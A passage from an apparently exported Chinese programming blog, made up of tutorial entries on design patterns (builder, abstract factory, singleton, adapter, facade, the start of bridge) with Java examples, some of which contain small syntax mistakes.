<li>产品的创建基于静态方法,造成产品无法形成基于继承的等级结构</li>
</ul>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ol>
<li>加密场景 KeyGenerator keyGen&#x3D;KeyGenerator.getInstance(“DESede”);</li>
<li>DateFormat JDK类库中广泛使用了简单工厂模式，如工具类java.text.DateFormat，它用于格式化一个本地日期或者时间。</li>
</ol>
<h4 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h4><ul>
<li><a href="https://design-patterns.readthedocs.io/zh_CN/latest/creational_patterns/simple_factory.html" target="_blank" rel="noopener">图说设计模式</a></li>
<li><a href="http://canyuda.top/posts/2019090532068/" target="_blank" rel="noopener">设计模式-简单工厂模式</a></li>
</ul>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式 创建型模式 创建者模式</title>
    <url>//2020/07/25/%E3%80%90%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F%E3%80%91%20%E5%88%9B%E5%BB%BA%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>1、定义：将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示<br>2、主要作用：在用户不知道对象的建造过程和细节的情况下就可以直接创建复杂的对象。<br>3、如何使用：用户只需要给出指定复杂对象的类型和内容，建造者模式负责按顺序创建复杂对象（把内部的建造过程和细节隐藏起来）<br>4、解决的问题：<br>（1）、方便用户创建复杂的对象（不需要知道实现过程）<br>（2）、代码复用性 &amp; 封装性（将对象构建过程和细节进行封装 &amp; 复用）<br>5、注意事项：与工厂模式的区别是：建造者模式更加关注与零件装配的顺序，一般用来创建更为复杂的对象</p>
<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><ul>
<li><p>抽象建造者（builder）：描述具体建造者的公共接口，一般用来定义建造细节的方法，并不涉及具体的对象部件的创建。</p>
</li>
<li><p>具体建造者（ConcreteBuilder）：描述具体建造者，并实现抽象建造者公共接口。</p>
</li>
<li><p>指挥者（Director）：调用具体建造者来创建复杂对象（产品）的各个部分，并按照一定顺序（流程）来建造复杂对象。</p>
</li>
<li><p>产品（Product）：描述一个由一系列部件组成较为复杂的对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Builder.java</span><br><span class="line"> *  建造者</span><br><span class="line"> */</span><br><span class="line">abstract class Builder &#123;</span><br><span class="line">    //地基</span><br><span class="line">    abstract void bulidA();</span><br><span class="line">    //钢筋工程</span><br><span class="line">    abstract void bulidB();</span><br><span class="line">    //铺电线</span><br><span class="line">    abstract void bulidC();</span><br><span class="line">    //粉刷</span><br><span class="line">    abstract void bulidD();</span><br><span class="line">    //完工-获取产品</span><br><span class="line">    abstract Product getProduct();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Product.java</span><br><span class="line"> *  产品（房子）</span><br><span class="line"> */</span><br><span class="line">public class Product &#123;</span><br><span class="line">    private String buildA;</span><br><span class="line">    private String buildB;</span><br><span class="line">    private String buildC;</span><br><span class="line">    private String buildD;</span><br><span class="line">    public String getBuildA() &#123;</span><br><span class="line">        return buildA;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setBuildA(String buildA) &#123;</span><br><span class="line">        this.buildA = buildA;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getBuildB() &#123;</span><br><span class="line">        return buildB;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setBuildB(String buildB) &#123;</span><br><span class="line">        this.buildB = buildB;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getBuildC() &#123;</span><br><span class="line">        return buildC;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setBuildC(String buildC) &#123;</span><br><span class="line">        this.buildC = buildC;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getBuildD() &#123;</span><br><span class="line">        return buildD;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setBuildD(String buildD) &#123;</span><br><span class="line">        this.buildD = buildD;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">        public String toString() &#123;</span><br><span class="line">            return buildA+&quot;\n&quot;+buildB+&quot;\n&quot;+buildC+&quot;\n&quot;+buildD+&quot;\n&quot;+&quot;房子验收完成&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * ConcreteBuilder.java</span><br><span class="line"> *  具体建造者(工人)</span><br><span class="line"> */</span><br><span class="line">public class ConcreteBuilder extends Builder&#123;</span><br><span class="line">    private Product product;</span><br><span class="line">    public ConcreteBuilder() &#123;</span><br><span class="line">        product = new Product();</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    void bulidA() &#123;</span><br><span class="line">        product.setBuildA(&quot;地基&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    void bulidB() &#123;</span><br><span class="line">        product.setBuildB(&quot;钢筋工程&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    void bulidC() &#123;</span><br><span class="line">        product.setBuildC(&quot;铺电线&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    void bulidD() &#123;</span><br><span class="line">        product.setBuildD(&quot;粉刷&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    Product getProduct() &#123;</span><br><span class="line">        return product;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Director.java</span><br><span class="line"> *  指挥者</span><br><span class="line"> */</span><br><span class="line">public class Director &#123;</span><br><span class="line">    //指挥工人按顺序造房</span><br><span class="line">    public Product create(Builder builder) &#123;</span><br><span class="line">        builder.bulidA();</span><br><span class="line">        builder.bulidB();</span><br><span class="line">        builder.bulidC();</span><br><span class="line">        builder.bulidD();</span><br><span class="line">        return builder.getProduct();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Test.java</span><br><span class="line"> *  测试类</span><br><span class="line"> */</span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Director director = new Director();</span><br><span class="line">        Product create = director.create(new ConcreteBuilder());</span><br><span class="line">        System.out.println(create.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>Builder 抽象类定义构建的方法</li>
<li>具体实现类实现Builder相关的方法-叫具体建造者</li>
<li>指挥者操作操作具体建造者按照顺序创建对象</li>
<li>产品类有大量属性</li>
</ol>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li>按照顺序创建对象</li>
<li>创建代码可读性好</li>
<li>隐藏对象大量属性,可以设置一些属性的默认值</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>代码冗余</li>
<li>具体建造者内部代码复杂,代码可读性差</li>
</ul>
<h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><ul>
<li><p>protobuf生成的实体类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SimpleRequest.Builder builder = SimpleRequest.newBuilder();</span><br><span class="line">builder.setId(12341);</span><br><span class="line">builder.setName(&quot;你好&quot;);</span><br><span class="line">SimpleRequest request = builder.build();</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式 创建型模式 抽象方法模式</title>
    <url>//2020/07/20/%E3%80%90%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F%E3%80%91%E6%8A%BD%E8%B1%A1%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>抽象方法模式是工厂方法模式的一种扩展,最简单的抽象方法模式会退化成了工厂方法模式,抽象方法模式提出了产品族的一个概念。那么什么是产品族呢？还是以汽车为例,汽车是一个产品的抽象,汽车的型号就是汽车的产品族比如,suv,轿车,跑车。如果工厂模式创建的不是一个简单的产品,而是多个产品族的情况,那么就需要使用抽象方法模式\</p>
<h3 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h3><p>抽象方法模式需要以下几个角色</p>
<ul>
<li><p>抽象工厂类</p>
</li>
<li><p>产品工厂类</p>
</li>
<li><p>抽象产品类</p>
</li>
<li><p>产品类\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1585581293704.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure></li>
</ul>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public abstract class  AbstractCarFactory &#123;</span><br><span class="line">        abstract void buildSuv();</span><br><span class="line">        abstract void buildJiaoche();</span><br><span class="line">        abstract void buildYueYeChe();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>public class BaoJunCarFactory extends AbstractCarFactory {<br>private BaojunCar baojunCar&#x3D;new BaojunCar();<br>@Override<br>void buildSuv() {</p>
<pre><code>  baojunCar.suv();
</code></pre>
<p>}</p>
<p>@Override<br>void buildJiaoche() {</p>
<pre><code>  baojunCar.jiaoche();
</code></pre>
<p>}</p>
<p>@Override<br>void buildYueYeChe() {</p>
<pre><code>  baojunCar.yueyeche();
</code></pre>
<p>}<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class BMWCarFactory extends AbstractCarFactory &#123;</span><br><span class="line"></span><br><span class="line">    private BMWCar bmwCar =new BMWCar();</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    void buildSuv() &#123;</span><br><span class="line">        bmwCar.suv();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    void buildJiaoche() &#123;</span><br><span class="line">        bmwCar.jiaoche();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    void buildYueYeChe() &#123;</span><br><span class="line">        bmwCar.yueyeche();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class BaojunCar implements Car &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void yueyeche() &#123;</span><br><span class="line">        System.out.println(&quot;宝骏 越野车&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void jiaoche() &#123;</span><br><span class="line">        System.out.println(&quot;宝骏 轿车&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void suv() &#123;</span><br><span class="line">        System.out.println(&quot;宝骏 suv&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class BMWCar implements Car &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void yueyeche() &#123;</span><br><span class="line">        System.out.println(&quot;宝马 越野车&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void jiaoche() &#123;</span><br><span class="line">        System.out.println(&quot;宝马 轿车&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void suv() &#123;</span><br><span class="line">        System.out.println(&quot;宝马 suv&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Car &#123;</span><br><span class="line">    void yueyeche();</span><br><span class="line">    void jiaoche();</span><br><span class="line">    void suv();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        BaoJunCarFactory baoJunCarFactory =new BaoJunCarFactory();</span><br><span class="line">        baoJunCarFactory.buildJiaoche();</span><br><span class="line">        baoJunCarFactory.buildSuv();</span><br><span class="line">        baoJunCarFactory.buildYueYeChe();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BMWCarFactory bmwCarFactory =new BMWCarFactory();</span><br><span class="line">        bmwCarFactory.buildJiaoche();</span><br><span class="line">        bmwCarFactory.buildSuv();</span><br><span class="line">        bmwCarFactory.buildYueYeChe();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们的抽象工厂定义了多个抽象方法,这也就是为什么叫抽象方法模式的原因了。实际上和工厂方法模式一样。只是有产品族抽象方法的概念</p>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><ul>
<li>复合高内聚低耦合的开发设计规范,抽象工厂模式将创建产品的逻辑收敛起来,如果更换产品只需要选择对应的工厂方法即可</li>
<li>增加具体产品工厂和产品很方便</li>
<li>当产品族中的多个对象一起工作的时候,客户端只能使用同一个产品族的对象</li>
</ul>
<h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><ul>
<li>开闭原则的倾斜性,增加产品和产品工厂很方便,增加产品族很困难,所以设计抽象方法的时候一定要尽可能多的设计抽象方法</li>
</ul>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>客户端切换界面主题, 各个控件对象的构造过程都收敛到同一个工厂类中</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式 创建型模式 单例模式</title>
    <url>//2020/08/02/%E3%80%90%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F%E3%80%91%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>单例模式对于开发人员来讲并不陌生通过单利模式可以控制应用程序中,只有一个对象的实例,分为饿汉式和懒汉式.饿汉式在类加载的时候就初始化,懒汉模式拥有延迟加载的思想,在使用的时候创建。实现单例模式的思想就是私有构造方法。通过getInstance()方法获取对应实例\</p>
<h3 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Singleton&#123;</span><br><span class="line"> private static final Singleton singleton =new Singleton();</span><br><span class="line">private Singleton&#123;</span><br><span class="line"> &#125;</span><br><span class="line"> public static Singleton getInstance()&#123;</span><br><span class="line"> return singleton;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="懒汉式"><a href="#懒汉式" class="headerlink" title="懒汉式"></a>懒汉式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Singleton&#123;</span><br><span class="line"> private static final singleton = null;</span><br><span class="line">private Singleton&#123;</span><br><span class="line"> &#125;</span><br><span class="line">  private Singleton&#123;</span><br><span class="line">  &#125;</span><br><span class="line">public static Singleton getInstance()&#123;</span><br><span class="line">if(null==singleton)&#123;</span><br><span class="line"> singleton =new Singleton();</span><br><span class="line">&#125;</span><br><span class="line">return singleton;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的实现方式在多线程的环境下是线程不安全的,下面来个线程安全的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Singleton&#123;</span><br><span class="line">// volatile 保证每次都从主内存中取,不会在工作线程内存中取,效率不高</span><br><span class="line"> private static volatile final singleton = null;</span><br><span class="line">  private Singleton&#123;</span><br><span class="line">  &#125;</span><br><span class="line">public static Singleton getInstance()&#123;</span><br><span class="line">if(null==singleton)&#123;</span><br><span class="line">   //双重锁检查</span><br><span class="line">   synchronized(Singleton.class) &#123;</span><br><span class="line">    if(null==singleton)&#123;</span><br><span class="line">         singleton =new Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">return singleton;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是利用jvm加载静态内部类的方式实现单例模式.jvm初始化类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Singleton&#123;</span><br><span class="line">  private static class SingletonHodle&#123;</span><br><span class="line">   private static Singleton singleton =new Singleton();</span><br><span class="line">public static getInstance()&#123;</span><br><span class="line">// 保证jvm加载SingletonHodle初始Singleton实例</span><br><span class="line">return SingletonHodle.singleton;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用枚举实现单子例模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public enum Singleton &#123;</span><br><span class="line">    uniqueInstance;// 定义一个枚举的元素，它就代表了Singleton的一个实例,因为枚举在编译成class文件,对应的属性就是 static final的保证了jvm初始化类的时候只能生成一个实例</span><br><span class="line">    public void singletonOperation() &#123;</span><br><span class="line">        // 功能处理</span><br><span class="line">        System.err.println(&quot;功能处理&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="破快单利模式的三种方式"><a href="#破快单利模式的三种方式" class="headerlink" title="破快单利模式的三种方式"></a>破快单利模式的三种方式</h3><ul>
<li>序列化</li>
<li>反射</li>
<li>clone</li>
</ul>
<h3 id="如何避免单利模式被破快"><a href="#如何避免单利模式被破快" class="headerlink" title="如何避免单利模式被破快"></a>如何避免单利模式被破快</h3><ul>
<li>序列化<br>增加readResolve()方法,返回实例对象</li>
<li>反射<br>创建标志位,is_create标志,如果is_create&#x3D;true 则抛异常</li>
<li>clone<br>重写clone方法,返回对应的instance</li>
</ul>
<h3 id="jdk的实现"><a href="#jdk的实现" class="headerlink" title="jdk的实现"></a>jdk的实现</h3><p>我们 JDK 中，java.lang.Runtime 就是经典的单例模式(饿汉式)</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式 结构型模式 适配器模式</title>
    <url>//2020/08/15/%E3%80%90%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F%E3%80%91%20%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>适配器模式属于结构性模式,将适配类的api转化为目标类的api,如mac电脑使用的是typec的接口,连接显示器需要hdmi接口。我们要使用mac连接显示器,需要使用扩展坞,这其实就是适配器模式。</p>
<h3 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h3><figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1586158261596.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul>
<li>类适配<br>是基于继承实现的</li>
<li>对象适配<br>使用组合方式实现,更加灵活</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class MacInterface &#123;</span><br><span class="line">        public void typeC()&#123;</span><br><span class="line">            System.out.println(&quot;type 已经连接..&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Monitor &#123;</span><br><span class="line"></span><br><span class="line">     void hdml();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>类适配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ExtendUtil extends MacInterface implements Monitor &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void hdml() &#123;</span><br><span class="line">        super.typeC();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>对象适配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ExtendUtilV2 implements Monitor&#123;</span><br><span class="line">    private MacInterface macInterface;</span><br><span class="line">    public ExtendUtilV2()&#123;</span><br><span class="line">        macInterface =new MacInterface();</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void hdml() &#123;</span><br><span class="line">        macInterface.typeC();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main  &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 类适配模式</span><br><span class="line">        ExtendUtil extendUtil =new ExtendUtil();</span><br><span class="line">        extendUtil.hdml();</span><br><span class="line">        // 对象适配模式</span><br><span class="line">        ExtendUtilV2 extendUtilV2 =new ExtendUtilV2();</span><br><span class="line">        extendUtilV2.hdml();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1586158475272.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure></li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>优点</li>
</ul>
<ol>
<li>复用性好,可以适配系统中已经存在的方法,无需重写</li>
<li>扩展性好,可以在适配类中添加想要适配的方法</li>
</ol>
<ul>
<li>缺点</li>
</ul>
<ol>
<li>系统中一旦适配类变多则导致系统代码混乱。代码晦涩难懂</li>
</ol>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式 结构型模式 外观模式</title>
    <url>//2020/08/19/%E3%80%90%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F%E3%80%91%20%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>外观模式属于结构型模式的一种,当子系统的方法众多,可以引用外观模式在外观类将子方法的方法封装起来,外观类提供简单的api方法。外观类的方法屏蔽掉了复杂的api调用</p>
<h3 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h3><p>下图为外观模式类图\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1586160133719.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class SubMethod1 &#123;</span><br><span class="line">    public void method1()&#123;</span><br><span class="line">        System.out.println(&quot;子系统中类1的方法1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class SubMethod2 &#123;</span><br><span class="line">     public void method2()&#123;</span><br><span class="line">         System.out.println(&quot;子系统中类2方法2&quot;);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class SubMethod3 &#123;</span><br><span class="line">    public void method3()&#123;</span><br><span class="line">        System.out.println(&quot;子系统类3方法3&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Facader &#123;</span><br><span class="line">    private SubMethod1 sm1 = new SubMethod1();</span><br><span class="line">    private SubMethod2 sm2 = new SubMethod2();</span><br><span class="line">    private SubMethod3 sm3 = new SubMethod3();</span><br><span class="line">    public void facMethod1()&#123;</span><br><span class="line">        sm1.method1();</span><br><span class="line">        sm2.method2();</span><br><span class="line">    &#125;</span><br><span class="line">    public void facMethod2()&#123;</span><br><span class="line">        sm2.method2();</span><br><span class="line">        sm3.method3();</span><br><span class="line">        sm1.method1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Clienter &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Facader face = new Facader();</span><br><span class="line">        face.facMethod1();</span><br><span class="line">//        face.facMethod2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>优点<br>外观模式的优点<br>对客户屏蔽子系统组件，减少了客户处理的对象数目并使得子系统使用起来更加容易。通过引入外观模式，客户代码将变得很简单，与之关联的对象也很少。<br>实现了子系统与客户之间的松耦合关系，这使得子系统的组件变化不会影响到调用它的客户类，只需要调整外观类即可。<br>降低了大型软件系统中的编译依赖性，并简化了系统在不同平台之间的移植过程，因为编译一个子系统一般不需要编译所有其他的子系统。一个子系统的修改对其他子系统没有任何影响，而且子系统内部变化也不会影响到外观对象。<br>只是提供了一个访问子系统的统一入口，并不影响用户直接使用子系统类。</li>
<li>缺点<br>外观模式的缺点<br>不能很好地限制客户使用子系统类，如果对客户访问子系统类做太多的限制则减少了可变性和灵活性。<br>在不引入抽象外观类的情况下，增加新的子系统可能需要修改外观类或客户端的源代码，违背了“开闭原则”。</li>
</ul>
<p>自己总结<br>优点：</p>
<ol>
<li>功能调用子系统的方法太多,不好维护使用外观模式来屏蔽复杂子系统方法的调用,代码更简单</li>
<li>子类和使用者之间体现了松耦合的关系,修改功能只需要修改外观类即可<br>缺点:<br>如果使用太多子系统的方法,会使外观类不好维护,可变性灵活性下降</li>
</ol>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式 结构型模式 桥接模式</title>
    <url>//2020/08/29/%E3%80%90%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F%E3%80%91%20%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>桥接（Bridge）是用于把抽象化与实现化解耦，使得二者可以独立变化。这种类型的设计模式属于结构型模式，它通过提供抽象化和实现化之间的桥接结构，来实现二者的解耦。</p>
<p>　　这种模式涉及到一个作为桥接的接口，使得实体类的功能独立于接口实现类。这两种类型的类可被结构化改变而互不影响。<br>例子：总共又长方形、正方形、三角形、圆形四个形状。如果现在有需求每个形状要有红、黄、蓝，三个颜色。最能想到的是在每个形状下在创建长方形-红、长方形-黄、长方形-蓝、正方形-红、正方形-黄、正方形-蓝…..等等来进行实现。<br>而使用桥接模式则创建一个抽象的 颜色类。并且实现红色类,黄色类,蓝色类。<br>扩充的形状类存储颜色的引用对象在创建形状的时候去添加对应的颜色引用对象。</p>
